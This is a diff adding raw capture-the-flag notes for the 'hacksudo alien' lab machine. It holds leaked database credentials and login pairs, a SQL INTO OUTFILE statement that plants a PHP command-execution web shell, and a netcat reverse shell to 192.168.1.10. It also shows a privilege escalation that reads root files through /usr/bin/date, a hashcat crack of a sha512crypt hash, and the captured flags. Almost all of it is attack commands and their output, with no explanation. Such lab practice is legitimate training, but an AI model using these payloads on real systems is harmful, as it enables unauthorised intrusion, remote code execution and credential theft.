@@ -1,0 +1,88 @@
+
+
+
+root@kali:~/Scaricati# cat mysql.bak 
+#!/bin/bash
+
+# Specify which database is to be backed up
+db_name=""
+
+# Set the website which this database relates to
+website="localhost"
+
+# Database credentials
+user="vishal"
+password="hacksudo"
+host="localhost"
+
+# How many days would you like to keep files for?
+days="30"
+
+
+phpmyadmin:root
+
+shovon:123
+
+hacksudo:123
+
+
+SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
+INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
+
+
+nc -e /bin/bash 192.168.1.10 1234
+
+
+Run LinPeas.sh
+
+---> /usr/bin/date
+
+
+/usr/bin/date: /home/hacksudo/user.txt: No such file or directory
+www-data@hacksudo:/tmp$ 
+
+www-data@hacksudo:/tmp$ /usr/bin/date -f /root/root.txt
+/usr/bin/date -f /root/root.txt
+/usr/bin/date: invalid date ' _   _            _                  _       '
+/usr/bin/date: invalid date '| | | | __ _  ___| | _____ _   _  __| | ___  '
+/usr/bin/date: invalid date '| |_| |/ _` |/ __| |/ / __| | | |/ _` |/ _ \\ '
+/usr/bin/date: invalid date '|  _  | (_| | (__|   <\\__ \\ |_| | (_| | (_) |'
+/usr/bin/date: invalid date '|_| |_|\\__,_|\\___|_|\\_\\___/\\__,_|\\__,_|\\___/ '
+Wed Apr  7 00:00:00 EDT 2021
+/usr/bin/date: invalid date '    _    _ _            ____   __   '
+/usr/bin/date: invalid date '   / \\  | (_) ___ _ __ | ___| / /_  '
+/usr/bin/date: invalid date '  / _ \\ | | |/ _ \\ \'_ \\|___ \\| \'_ \\ '
+/usr/bin/date: invalid date ' / ___ \\| | |  __/ | | |___) | (_) |'
+/usr/bin/date: invalid date '/_/   \\_\\_|_|\\___|_| |_|____/ \\___/ '
+Wed Apr  7 00:00:00 EDT 2021
+/usr/bin/date: invalid date 'congratulations you rooted hacksudo alien56...!!!'
+/usr/bin/date: invalid date 'flag={d045e6f9feb79e94442213f9d008ac48}'
+
+
+
+
+$6$cOv4E/VKAe0EVwV4$YScCx10zfi7g4aiLY.qo8QPm2iOogJea41mk2rGk/0JM5AtnrmiyTN5ctNJ0KTLS5Iru4lHWYPug792u3L/Um1:aliens
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: sha512crypt $6$, SHA512 (Unix)
+Hash.Target......: $6$cOv4E/VKAe0EVwV4$YScCx10zfi7g4aiLY.qo8QPm2iOogJe...3L/Um1
+Time.Started.....: Wed Apr  7 23:47:01 2021 (13 secs)
+Time.Estimated...: Wed Apr  7 23:47:14 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      611 H/s (9.78ms) @ Accel:128 Loops:64 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 7680/14344385 (0.05%)
+Rejected.........: 0/7680 (0.00%)
+Restore.Point....: 7168/14344385 (0.05%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
+Candidates.#1....: droopy -> thesimpsons
+
+Started: Wed Apr  7 23:46:43 2021
+Stopped: Wed Apr  7 23:47:15 2021
+
+
+hacksudo@hacksudo:~/Desktop$ cat user.txt 
+9fb4c0afce26929041427c935c6e0879
+hacksudo@hacksudo:~/Desktop$ 
